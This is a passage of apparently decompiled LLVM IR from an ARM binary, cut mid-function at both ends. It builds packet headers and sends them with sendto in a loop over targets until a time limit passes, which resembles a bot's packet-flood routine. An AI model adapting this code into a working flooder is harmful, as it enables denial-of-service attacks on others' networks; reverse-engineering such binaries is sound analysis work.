  %v0_e774 = load i32, i32* %lr.global-to-local, align 4
  %v1_e774 = add i32 %v0_e774, 20
  store i32 %v1_e774, i32* %r4.global-to-local, align 4
  %v0_e778 = load i32, i32* %r8.global-to-local, align 4
  %v1_e778 = trunc i32 %v0_e778 to i8
  %v3_e778 = add i32 %v0_e774, 4
  %v4_e778 = inttoptr i32 %v3_e778 to i8*
  store i8 %v1_e778, i8* %v4_e778, align 1
  %v0_e77c = load i32, i32* %r6.global-to-local, align 4
  %v1_e77c = trunc i32 %v0_e77c to i8
  %v2_e77c = load i32, i32* %lr.global-to-local, align 4
  %v3_e77c = add i32 %v2_e77c, 20
  %v4_e77c = inttoptr i32 %v3_e77c to i8*
  store i8 %v1_e77c, i8* %v4_e77c, align 1
  %v0_e780 = load i32, i32* %r3.global-to-local, align 4
  %v1_e780 = trunc i32 %v0_e780 to i8
  %v2_e780 = load i32, i32* %r4.global-to-local, align 4
  %v3_e780 = add i32 %v2_e780, 5
  %v4_e780 = inttoptr i32 %v3_e780 to i8*
  store i8 %v1_e780, i8* %v4_e780, align 1
  %v0_e784 = load i32, i32* %r5.global-to-local, align 4
  %v1_e784 = trunc i32 %v0_e784 to i8
  %v2_e784 = load i32, i32* %r4.global-to-local, align 4
  %v3_e784 = add i32 %v2_e784, 2
  %v4_e784 = inttoptr i32 %v3_e784 to i8*
  store i8 %v1_e784, i8* %v4_e784, align 1
  %v0_e788 = load i32, i32* %r7.global-to-local, align 4
  %v1_e788 = trunc i32 %v0_e788 to i8
  %v2_e788 = load i32, i32* %r4.global-to-local, align 4
  %v3_e788 = add i32 %v2_e788, 1
  %v4_e788 = inttoptr i32 %v3_e788 to i8*
  store i8 %v1_e788, i8* %v4_e788, align 1
  %v0_e78c = load i32, i32* %lr.global-to-local, align 4
  %v1_e78c = add i32 %v0_e78c, 32
  %v0_e790 = load i32, i32* %r2.global-to-local, align 4
  %v1_e790 = trunc i32 %v0_e790 to i8
  %v2_e790 = load i32, i32* %r4.global-to-local, align 4
  %v3_e790 = add i32 %v2_e790, 3
  %v4_e790 = inttoptr i32 %v3_e790 to i8*
  store i8 %v1_e790, i8* %v4_e790, align 1
  %v0_e794 = load i32, i32* %ip.global-to-local, align 4
  %v1_e794 = trunc i32 %v0_e794 to i8
  %v2_e794 = load i32, i32* %r4.global-to-local, align 4
  %v3_e794 = add i32 %v2_e794, 4
  %v4_e794 = inttoptr i32 %v3_e794 to i8*
  store i8 %v1_e794, i8* %v4_e794, align 1
  %v3_e798 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_e798, i32* %r2.global-to-local, align 4
  %v3_e79c = call i32 @function_12db0(i32 %v1_e78c, i32 %v3_e5c8, i32 %v3_e798)
  %v3_e7a0 = load i32, i32* %stack_var_-40, align 4
  %v1_e7a4 = add i32 %v3_e7a0, 1
  store i32 %v1_e7a4, i32* %r4.global-to-local, align 4
  store i32 %v1_e4bc, i32* %r3.global-to-local, align 4
  %v9_e7ac = icmp eq i32 %v1_e7a4, %v1_e4bc
  store i1 %v9_e7ac, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e7a4, i32* %stack_var_-40, align 4
  %v5_e7b4 = icmp slt i32 %v1_e7a4, %v1_e4bc
  br i1 %v5_e7b4, label %dec_label_pc_e690, label %dec_label_pc_e7b8

dec_label_pc_e7b8:                                ; preds = %bb48, %dec_label_pc_e98c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_e634, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_e634, label %dec_label_pc_e98c, label %dec_label_pc_e7cc

dec_label_pc_e7cc:                                ; preds = %dec_label_pc_e7b8
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_e7dc = icmp eq i32 %v3_e628, add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1)
  br label %dec_label_pc_e8b0

dec_label_pc_e7d8:                                ; preds = %dec_label_pc_e8b0
  store i1 %v9_e7dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e7dc, label %dec_label_pc_e940, label %dec_label_pc_e7e4

dec_label_pc_e7e4:                                ; preds = %dec_label_pc_e8d8.dec_label_pc_e7e4_crit_edge, %dec_label_pc_e7d8
  %v1_e7e8 = phi i32 [ %v1_e7e8.pre, %dec_label_pc_e8d8.dec_label_pc_e7e4_crit_edge ], [ add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), %dec_label_pc_e7d8 ]
  store i32 %v3_e62c, i32* %r2.global-to-local, align 4
  %v9_e7e8 = icmp eq i32 %v3_e62c, %v1_e7e8
  store i1 %v9_e7e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e7e8, label %dec_label_pc_e95c, label %dec_label_pc_e7f0

dec_label_pc_e7f0:                                ; preds = %dec_label_pc_e940.dec_label_pc_e7f0_crit_edge, %dec_label_pc_e7e4
  %v1_e7f4 = phi i32 [ %v1_e7f4.pre, %dec_label_pc_e940.dec_label_pc_e7f0_crit_edge ], [ %v1_e7e8, %dec_label_pc_e7e4 ]
  store i32 %v3_e630, i32* %r3.global-to-local, align 4
  %v9_e7f4 = icmp eq i32 %v3_e630, %v1_e7f4
  store i1 %v9_e7f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e7f4, label %dec_label_pc_e978, label %dec_label_pc_e7fc

dec_label_pc_e7fc:                                ; preds = %dec_label_pc_e95c, %dec_label_pc_e7f0, %dec_label_pc_e978
  %v0_e800 = load i32, i32* %r8.global-to-local, align 4
  %v1_e800 = trunc i32 %v0_e800 to i8
  %v2_e800 = load i32, i32* @r5, align 4
  %v3_e800 = add i32 %v2_e800, 10
  %v4_e800 = inttoptr i32 %v3_e800 to i8*
  store i8 %v1_e800, i8* %v4_e800, align 1
  %v0_e804 = load i32, i32* %r8.global-to-local, align 4
  %v1_e804 = trunc i32 %v0_e804 to i8
  %v2_e804 = load i32, i32* @r5, align 4
  %v3_e804 = add i32 %v2_e804, 11
  %v4_e804 = inttoptr i32 %v3_e804 to i8*
  store i8 %v1_e804, i8* %v4_e804, align 1
  %v0_e808 = load i32, i32* @r5, align 4
  store i32 %v0_e808, i32* @r0, align 4
  %v2_e80c = call i32 @function_f188(i32 %v0_e808, i32 20)
  %v3_e80c = trunc i32 %v2_e80c to i8
  %v4_e810 = sdiv i32 %v2_e80c, 256
  store i32 %v4_e810, i32* %r3.global-to-local, align 4
  %v1_e814 = trunc i32 %v4_e810 to i8
  %v2_e814 = load i32, i32* @r5, align 4
  %v3_e814 = add i32 %v2_e814, 11
  %v4_e814 = inttoptr i32 %v3_e814 to i8*
  store i8 %v1_e814, i8* %v4_e814, align 1
  %v3_e818 = load i32, i32* @r5, align 4
  %v4_e818 = add i32 %v3_e818, 10
  %v5_e818 = inttoptr i32 %v4_e818 to i8*
  store i8 %v3_e80c, i8* %v5_e818, align 1
  %v0_e81c = load i32, i32* %r8.global-to-local, align 4
  %v1_e81c = trunc i32 %v0_e81c to i8
  %v2_e81c = load i32, i32* @r6, align 4
  %v3_e81c = add i32 %v2_e81c, 6
  %v4_e81c = inttoptr i32 %v3_e81c to i8*
  store i8 %v1_e81c, i8* %v4_e81c, align 1
  %v0_e820 = load i32, i32* %r8.global-to-local, align 4
  %v1_e820 = trunc i32 %v0_e820 to i8
  %v2_e820 = load i32, i32* @r6, align 4
  %v3_e820 = add i32 %v2_e820, 7
  %v4_e820 = inttoptr i32 %v3_e820 to i8*
  store i8 %v1_e820, i8* %v4_e820, align 1
  %v0_e824 = load i32, i32* @r5, align 4
  %v1_e824 = add i32 %v0_e824, 24
  %v2_e824 = inttoptr i32 %v1_e824 to i8*
  %v3_e824 = load i8, i8* %v2_e824, align 1
  %v4_e824 = zext i8 %v3_e824 to i32
  store i32 %v4_e824, i32* %r3.global-to-local, align 4
  %v1_e828 = add i32 %v0_e824, 25
  %v2_e828 = inttoptr i32 %v1_e828 to i8*
  %v3_e828 = load i8, i8* %v2_e828, align 1
  %v4_e828 = zext i8 %v3_e828 to i32
  %v4_e82c = mul nuw nsw i32 %v4_e828, 256
  %v5_e82c = or i32 %v4_e82c, %v4_e824
  store i32 %v5_e82c, i32* %r2.global-to-local, align 4
  %v3_e830 = load i32, i32* %stack_var_-44, align 4
  %v0_e834 = load i32, i32* @r6, align 4
  store i32 %v0_e834, i32* @r1, align 4
  %v1_e838 = add i32 %v3_e830, 12
  store i32 %v1_e838, i32* %r3.global-to-local, align 4
  %v4_e840 = call i32 @function_f1e4(i32 %v0_e824, i32 %v0_e834, i32 %v5_e82c, i32 %v1_e838)
  %v5_e840 = trunc i32 %v4_e840 to i8
  %v4_e84415 = udiv i32 %v4_e840, 256
  %v1_e848 = trunc i32 %v4_e84415 to i8
  %v2_e848 = load i32, i32* @r6, align 4
  %v3_e848 = add i32 %v2_e848, 7
  %v4_e848 = inttoptr i32 %v3_e848 to i8*
  store i8 %v1_e848, i8* %v4_e848, align 1
  %v3_e84c = load i32, i32* @r6, align 4
  %v4_e84c = add i32 %v3_e84c, 6
  %v5_e84c = inttoptr i32 %v4_e84c to i8*
  store i8 %v5_e840, i8* %v5_e84c, align 1
  %v3_e850 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e850, i32* %r3.global-to-local, align 4
  %v0_e854 = load i32, i32* @r5, align 4
  %v1_e854 = add i32 %v0_e854, 20
  %v2_e854 = inttoptr i32 %v1_e854 to i32*
  %v3_e854 = load i32, i32* %v2_e854, align 4
  %v5_e85c = mul i32 %v3_e850, 24
  %v1_e860 = load i32, i32* @sl, align 4
  %v2_e860 = add i32 %v1_e860, %v5_e85c
  store i32 %v2_e860, i32* %ip.global-to-local, align 4
  %v3_e864 = udiv i32 %v3_e854, 65536
  store i32 %v3_e864, i32* %r2.global-to-local, align 4
  %v1_e868 = trunc i32 %v3_e864 to i8
  %v3_e868 = add i32 %v2_e860, 2
  %v4_e868 = inttoptr i32 %v3_e868 to i8*
  store i8 %v1_e868, i8* %v4_e868, align 1
  %v0_e86c = load i32, i32* %r2.global-to-local, align 4
  %v3_e86c16 = udiv i32 %v0_e86c, 256
  %v3_e870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_e870, i32* %r2.global-to-local, align 4
  %v1_e874 = trunc i32 %v3_e86c16 to i8
  %v2_e874 = load i32, i32* %ip.global-to-local, align 4
  %v3_e874 = add i32 %v2_e874, 3
  %v4_e874 = inttoptr i32 %v3_e874 to i8*
  store i8 %v1_e874, i8* %v4_e874, align 1
  store i32 16, i32* %r4.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e880 = load i32, i32* @r5, align 4
  %v0_e884 = load i32, i32* %r2.global-to-local, align 4
  %v1_e884 = add i32 %v0_e884, 32
  store i32 %v1_e884, i32* %r2.global-to-local, align 4
  %v0_e888 = load i32, i32* %sb.global-to-local, align 4
  %v0_e890 = load i32, i32* %ip.global-to-local, align 4
  %v4_e890 = inttoptr i32 %v0_e890 to %sockaddr*
  %v7_e894 = inttoptr i32 %v0_e880 to i32*
  %v9_e894 = call i32 @sendto(i32 %v0_e888, i32* %v7_e894, i32 %v1_e884, i32 16384, %sockaddr* %v4_e890, i32 16)
  %v3_e898 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e898, i32* %r3.global-to-local, align 4
  %v1_e8a0 = add i32 %v3_e898, 1
  %v9_e8a4 = icmp eq i32 %v1_e8a0, %v1_e4bc
  store i1 %v9_e8a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e8a0, i32* %stack_var_-40, align 4
  %v6_e8ac = icmp slt i32 %v1_e8a0, %v1_e4bc
  br i1 %v6_e8ac, label %dec_label_pc_e8b0, label %dec_label_pc_e98c

dec_label_pc_e8b0:                                ; preds = %dec_label_pc_e7fc, %dec_label_pc_e7cc
  %v1_e8c0 = phi i32 [ %v1_e8a0, %dec_label_pc_e7fc ], [ 0, %dec_label_pc_e7cc ]
  %v5_e8b4 = mul i32 %v1_e8c0, 24
  %v1_e8b8 = load i32, i32* @sl, align 4
  %v2_e8b8 = add i32 %v1_e8b8, %v5_e8b4
  store i32 %v2_e8b8, i32* %r3.global-to-local, align 4
  %v1_e8bc = add i32 %v2_e8b8, 20
  %v2_e8bc = inttoptr i32 %v1_e8bc to i8*
  %v3_e8bc = load i8, i8* %v2_e8bc, align 1
  %v4_e8bc = zext i8 %v3_e8bc to i32
  store i32 %v4_e8bc, i32* %r2.global-to-local, align 4
  %v0_e8c0 = load i32, i32* %fp.global-to-local, align 4
  %v4_e8c0 = mul i32 %v1_e8c0, 4
  %v5_e8c0 = add i32 %v0_e8c0, %v4_e8c0
  %v6_e8c0 = inttoptr i32 %v5_e8c0 to i32*
  %v7_e8c0 = load i32, i32* %v6_e8c0, align 4
  store i32 %v7_e8c0, i32* @r5, align 4
  %v2_e8c8 = icmp ugt i8 %v3_e8bc, 30
  %v7_e8c8 = icmp eq i8 %v3_e8bc, 31
  store i1 %v7_e8c8, i1* %cpsr_z.global-to-local, align 1
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r7.global-to-local, align 4
  %v1_e8d0 = add i32 %v7_e8c0, 20
  store i32 %v1_e8d0, i32* @r6, align 4
  %v2_e8d4 = xor i1 %v7_e8c8, true
  %v3_e8d4 = and i1 %v2_e8c8, %v2_e8d4
  br i1 %v3_e8d4, label %dec_label_pc_e7d8, label %dec_label_pc_e8d8

dec_label_pc_e8d8:                                ; preds = %dec_label_pc_e8b0
  %v1_e8d8 = add i32 %v2_e8b8, 16
  %v2_e8d8 = inttoptr i32 %v1_e8d8 to i32*
  %v3_e8d8 = load i32, i32* %v2_e8d8, align 4
  store i32 %v3_e8d8, i32* @r4, align 4
  %v0_e8dc = call i32 @function_105b0()
  %v3_e8e0 = load i32, i32* %stack_var_-40, align 4
  %v5_e8e8 = mul i32 %v3_e8e0, 24
  %v0_e8ec = load i32, i32* @r4, align 4
  %v1_e8f0 = and i32 %v0_e8ec, 65280
  store i32 %v1_e8f0, i32* %r3.global-to-local, align 4
  %v1_e8ec = udiv i32 %v0_e8ec, 256
  %v3_e8f4 = and i32 %v1_e8ec, 65280
  store i32 %v3_e8f4, i32* %r2.global-to-local, align 4
  %v1_e8f8 = load i32, i32* @sl, align 4
  %v2_e8f8 = add i32 %v1_e8f8, %v5_e8e8
  store i32 %v2_e8f8, i32* %ip.global-to-local, align 4
  %v1_e904 = add i32 %v2_e8f8, 20
  %v2_e904 = inttoptr i32 %v1_e904 to i8*
  %v3_e904 = load i8, i8* %v2_e904, align 1
  %v4_e904 = zext i8 %v3_e904 to i32
  store i32 %v4_e904, i32* %lr.global-to-local, align 4
  %v2_e90c = call i32 @llvm.bswap.i32(i32 %v0_e8ec)
  %v7_e910 = lshr i32 %v0_e8dc, %v4_e904
  %v8_e910 = add i32 %v7_e910, %v2_e90c
  store i32 %v8_e910, i32* %r2.global-to-local, align 4
  %v2_e92c = call i32 @llvm.bswap.i32(i32 %v8_e910)
  store i32 %v2_e92c, i32* %r3.global-to-local, align 4
  %v1_e934 = load i32, i32* %r7.global-to-local, align 4
  %v9_e934 = icmp eq i32 %v3_e628, %v1_e934
  store i1 %v9_e934, i1* %cpsr_z.global-to-local, align 1
  %v1_e938 = load i32, i32* @r5, align 4
  %v2_e938 = add i32 %v1_e938, 16
  %v3_e938 = inttoptr i32 %v2_e938 to i32*
  store i32 %v2_e92c, i32* %v3_e938, align 4
  br i1 %v9_e934, label %dec_label_pc_e940, label %dec_label_pc_e8d8.dec_label_pc_e7e4_crit_edge

dec_label_pc_e8d8.dec_label_pc_e7e4_crit_edge:    ; preds = %dec_label_pc_e8d8
  %v1_e7e8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e7e4

dec_label_pc_e940:                                ; preds = %dec_label_pc_e8d8, %dec_label_pc_e7d8
  %v0_e940 = call i32 @function_105b0()
  %v1_e940 = trunc i32 %v0_e940 to i8
  store i32 %v3_e62c, i32* %r2.global-to-local, align 4
  %v4_e948 = sdiv i32 %v0_e940, 256
  store i32 %v4_e948, i32* %r3.global-to-local, align 4
  %v1_e94c = load i32, i32* %r7.global-to-local, align 4
  %v9_e94c = icmp eq i32 %v3_e62c, %v1_e94c
  store i1 %v9_e94c, i1* %cpsr_z.global-to-local, align 1
  %v1_e950 = trunc i32 %v4_e948 to i8
  %v2_e950 = load i32, i32* @r5, align 4
  %v3_e950 = add i32 %v2_e950, 5
  %v4_e950 = inttoptr i32 %v3_e950 to i8*
  store i8 %v1_e950, i8* %v4_e950, align 1
  %v3_e954 = load i32, i32* @r5, align 4
  %v4_e954 = add i32 %v3_e954, 4
  %v5_e954 = inttoptr i32 %v4_e954 to i8*
  store i8 %v1_e940, i8* %v5_e954, align 1
  %v0_e958 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e958, label %dec_label_pc_e95c, label %dec_label_pc_e940.dec_label_pc_e7f0_crit_edge

dec_label_pc_e940.dec_label_pc_e7f0_crit_edge:    ; preds = %dec_label_pc_e940
  %v1_e7f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e7f0

dec_label_pc_e95c:                                ; preds = %dec_label_pc_e940, %dec_label_pc_e7e4
  %v0_e95c = call i32 @function_105b0()
  %v1_e95c = trunc i32 %v0_e95c to i8
  %v4_e960 = sdiv i32 %v0_e95c, 256
  store i32 %v4_e960, i32* %r3.global-to-local, align 4
  %v3_e964 = load i32, i32* @r5, align 4
  %v4_e964 = add i32 %v3_e964, 20
  %v5_e964 = inttoptr i32 %v4_e964 to i8*
  store i8 %v1_e95c, i8* %v5_e964, align 1
  %v0_e968 = load i32, i32* %r3.global-to-local, align 4
  %v1_e968 = trunc i32 %v0_e968 to i8
  %v2_e968 = load i32, i32* @r6, align 4
  %v3_e968 = add i32 %v2_e968, 1
  %v4_e968 = inttoptr i32 %v3_e968 to i8*
  store i8 %v1_e968, i8* %v4_e968, align 1
  store i32 %v3_e630, i32* %r3.global-to-local, align 4
  %v1_e970 = load i32, i32* %r7.global-to-local, align 4
  %v9_e970 = icmp eq i32 %v3_e630, %v1_e970
  store i1 %v9_e970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e970, label %dec_label_pc_e978, label %dec_label_pc_e7fc

dec_label_pc_e978:                                ; preds = %dec_label_pc_e95c, %dec_label_pc_e7f0
  %v0_e978 = call i32 @function_105b0()
  %v1_e978 = trunc i32 %v0_e978 to i8
  %v4_e97c = sdiv i32 %v0_e978, 256
  store i32 %v4_e97c, i32* %r3.global-to-local, align 4
  %v1_e980 = trunc i32 %v4_e97c to i8
  %v2_e980 = load i32, i32* @r6, align 4
  %v3_e980 = add i32 %v2_e980, 3
  %v4_e980 = inttoptr i32 %v3_e980 to i8*
  store i8 %v1_e980, i8* %v4_e980, align 1
  %v3_e984 = load i32, i32* @r6, align 4
  %v4_e984 = add i32 %v3_e984, 2
  %v5_e984 = inttoptr i32 %v4_e984 to i8*
  store i8 %v1_e978, i8* %v5_e984, align 1
  br label %dec_label_pc_e7fc

dec_label_pc_e98c.critedge:                       ; preds = %dec_label_pc_e614
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_e98c

dec_label_pc_e98c:                                ; preds = %dec_label_pc_e7fc, %dec_label_pc_e98c.critedge, %dec_label_pc_e7b8
  %v2_e990 = call i32 @time(i32* null)
  %v9_e998 = icmp eq i32 %v2_e5b0, %v2_e990
  store i1 %v9_e998, i1* %cpsr_z.global-to-local, align 1
  %v6_e99c = icmp slt i32 %v2_e5b0, %v2_e990
  br i1 %v6_e99c, label %dec_label_pc_e9a0, label %dec_label_pc_e7b8

dec_label_pc_e9a0:                                ; preds = %dec_label_pc_e98c, %dec_label_pc_e4b8, %dec_label_pc_e9a8
  %v29_e9a4 = phi i32 [ %v3_e5dc, %dec_label_pc_e4b8 ], [ %v1_e9ac, %dec_label_pc_e9a8 ], [ %v2_e990, %dec_label_pc_e98c ]
  store i32 %v3_e4b8, i32* %r4.global-to-local, align 4
  store i32 %v6_e4b8, i32* %r5.global-to-local, align 4
  store i32 %v9_e4b8, i32* %r6.global-to-local, align 4
  store i32 %v12_e4b8, i32* %r7.global-to-local, align 4
  store i32 %v15_e4b8, i32* %r8.global-to-local, align 4
  ret i32 %v29_e9a4

dec_label_pc_e9a8:                                ; preds = %dec_label_pc_e5ec
  %v0_e9a8 = load i32, i32* %sb.global-to-local, align 4
  %v1_e9ac = call i32 @close(i32 %v0_e9a8)
  br label %dec_label_pc_e9a0

; uselistorder directives
  uselistorder i32 %v4_e97c, { 1, 0 }
  uselistorder i32 %v4_e948, { 1, 0 }
  uselistorder i32 %v2_e92c, { 1, 0 }
  uselistorder i32 %v0_e8ec, { 1, 0, 2 }
  uselistorder i32 %v1_e8a0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_e864, { 1, 0 }
  uselistorder i32 %v4_e810, { 1, 0 }
  uselistorder i32 %v1_e7a4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_e74c, { 1, 0 }
  uselistorder i32 %v1_e6d8, { 1, 0 }
  uselistorder i32 %v1_e664, { 1, 0 }
  uselistorder i32 %v3_e660, { 1, 0 }
  uselistorder i32 %v1_e654, { 1, 0 }
  uselistorder i32 %v3_e628, { 1, 0, 2 }
  uselistorder i32 %v0_e624, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e620, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_e60c, { 1, 0 }
  uselistorder i1 %v7_e5e0, { 1, 0 }
  uselistorder i32 %v3_e5dc, { 1, 2, 0 }
  uselistorder i32 %v2_e5b0, { 1, 0 }
  uselistorder i32 %v1_e568, { 1, 2, 0 }
  uselistorder i32 %v5_e500, { 1, 0 }
  uselistorder i32 %v1_e4bc, { 1, 2, 3, 4, 5, 7, 0, 6 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %stack_var_-40, { 0, 3, 4, 5, 6, 7, 8, 9, 10, 1, 11, 12, 2, 15, 13, 14 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 1, 4, 2, 5, 6, 7, 8 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 16, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 13, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 16, 17 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 0, 2, 3, 4, 5, 10, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 -8, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_e9a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e98c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e7fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e7b8, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_e9b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_e9b8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-2120 = alloca i32, align 4
  %v3_e9b8 = load i32, i32* @r4, align 4
  %v6_e9b8 = load i32, i32* @r5, align 4
  %v9_e9b8 = load i32, i32* @r6, align 4
  %v15_e9b8 = load i32, i32* @r8, align 4
  %v21_e9b8 = load i32, i32* @sl, align 4
  %v24_e9b8 = load i32, i32* @fp, align 4
  %v1_e9c4 = urem i32 %arg2, 256
  store i32 0, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %v1_e9c4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_e9dc = urem i32 %arg4, 256
  store i32 %v1_e9dc, i32* @r4, align 4
  store i32 %arg5, i32* @r5, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v2_e9ec = call i32* @calloc(i32 %v1_e9c4, i32 4)
  %v4_e9ec = ptrtoint i32* %v2_e9ec to i32
  %v0_e9f0 = load i32, i32* @r5, align 4
  store i32 %v0_e9f0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_e9fc = load i32, i32* @r4, align 4
  store i32 %v0_e9fc, i32* %r0.global-to-local, align 4
  %v0_ea00 = load i32, i32* @r6, align 4
  store i32 %v0_ea00, i32* %r3.global-to-local, align 4
  %v5_ea04 = inttoptr i32 %v0_e9f0 to i32*
  %v6_ea04 = call i32 @function_ad24(i32 %v0_e9fc, i32* %v5_ea04, i32 2, i32 %v0_ea00)
  %v1_ea10 = urem i32 %v6_ea04, 256
  store i32 %v1_ea10, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_ea1c = load i32, i32* @r4, align 4
  store i32 %v0_ea1c, i32* %r0.global-to-local, align 4
  %v0_ea20 = load i32, i32* @r5, align 4
  store i32 %v0_ea20, i32* %r1.global-to-local, align 4
  %v5_ea24 = trunc i32 %v6_ea04 to i8
  %v6_ea28 = inttoptr i32 %v0_ea20 to i32*
  %v7_ea28 = call i32 @function_ad24(i32 %v0_ea1c, i32* %v6_ea28, i32 3, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_ea2c = load i32, i32* @r5, align 4
  store i32 %v0_ea2c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_ea38 = load i32, i32* @r4, align 4
  store i32 %v0_ea38, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_ea40 = inttoptr i32 %v0_ea2c to i32*
  %v6_ea40 = call i32 @function_ad24(i32 %v0_ea38, i32* %v5_ea40, i32 4, i32 64)
  %v1_ea48 = urem i32 %v6_ea40, 256
  store i32 %v1_ea48, i32* %ip.global-to-local, align 4
  %v0_ea4c = load i32, i32* @r5, align 4
  store i32 %v0_ea4c, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v0_ea54 = load i32, i32* @r6, align 4
  store i32 %v0_ea54, i32* %r3.global-to-local, align 4
  %v0_ea58 = load i32, i32* @r4, align 4
  store i32 %v0_ea58, i32* %r0.global-to-local, align 4
  %v6_ea60 = inttoptr i32 %v0_ea4c to i32*
  %v7_ea60 = call i32 @function_ad24(i32 %v0_ea58, i32* %v6_ea60, i32 5, i32 %v0_ea54)
  %v1_ea6c = urem i32 %v7_ea60, 256
  store i32 %v1_ea6c, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_ea78 = load i32, i32* @r4, align 4
  store i32 %v0_ea78, i32* %r0.global-to-local, align 4
  %v0_ea7c = load i32, i32* @r5, align 4
  store i32 %v0_ea7c, i32* %r1.global-to-local, align 4
  %v5_ea84 = inttoptr i32 %v0_ea7c to i32*
  %v6_ea84 = call i32 @function_ad24(i32 %v0_ea78, i32* %v5_ea84, i32 6, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1))
  %v0_ea88 = load i32, i32* @r5, align 4
  store i32 %v0_ea88, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_ea94 = load i32, i32* @r4, align 4
  store i32 %v0_ea94, i32* %r0.global-to-local, align 4
  store i32 53, i32* %r3.global-to-local, align 4
  %v5_ea9c = inttoptr i32 %v0_ea88 to i32*
  %v6_ea9c = call i32 @function_ad24(i32 %v0_ea94, i32* %v5_ea9c, i32 7, i32 53)
  %v0_eaa8 = load i32, i32* @r5, align 4
  store i32 %v0_eaa8, i32* %r1.global-to-local, align 4
  %v0_eaac = load i32, i32* @r4, align 4
